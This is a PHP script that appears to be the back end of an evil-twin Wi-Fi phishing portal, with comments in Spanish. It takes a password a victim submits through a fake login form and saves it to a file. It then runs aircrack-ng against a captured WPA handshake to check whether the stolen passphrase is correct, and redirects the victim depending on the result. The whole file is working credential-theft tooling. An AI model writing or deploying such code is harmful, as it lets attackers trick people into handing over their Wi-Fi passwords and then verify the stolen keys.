<?php

// start file
$filepass = "./infohack/pass.txt";
$filescheck = "./infohack/check.txt";
$filestatus = "./infohack/status.txt";

//recibe pass
$pass= $_POST['p'];
#$pass= "12345678";


$file = fopen($filepass, "w");
fwrite($file,$pass);
fwrite($file,"\n");
fclose($file);

$checkpass = shell_exec('aircrack-ng -w ./infohack/pass.txt ./../capture/capture-01.cap | grep "Passphrase not in dictionary"');

$archivo1 = fopen($filescheck, "w");
fwrite($archivo1,$checkpass);
fclose($archivo1);

$result = file_get_contents($filescheck);
$resultcheck = 'Passphrase not in dictionary';

if (strncmp($result, $resultcheck, 28)===0) {

	$archivo2 = fopen($filestatus, "w");
	fwrite($archivo2,"NOK");
	fclose($archivo2);
	
}
else{
	$archivo2 = fopen($filestatus, "w");
	fwrite($archivo2,"OK");
	fclose($archivo2);
}




while(1) 
{

if (file_get_contents($filestatus) == "OK") {
	    header("location:final.html");
	    break;
	} 
if (file_get_contents($filestatus) == "NOK") {
	    header("location:error.html");
	    #unlink($intento);
	    break;
	}
	
sleep(1);
}

?>